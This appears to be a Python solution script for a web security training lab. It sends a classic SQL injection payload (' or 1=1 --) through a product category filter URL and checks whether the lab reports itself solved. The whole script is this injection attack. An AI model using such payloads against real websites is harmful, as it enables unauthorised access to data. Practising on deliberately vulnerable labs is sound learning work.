import requests
import re

url = input('Enter the URL the lab provide: ');
domain = re.search(r'^(https?://[^/]+)', url).group(1)
session = requests.Session()

payload_url = domain + '/filter?category=%27%20or%201=1%20--'
try:
    r = session.get(payload_url)
except requests.exceptions.ConnectionError:
    print('Error connecting to the server. Check your URL.')

if ('Solved' in r.text):
    print('Solved. Visit ' + domain + ' to see the solution.')
else:
    print('Not Solved')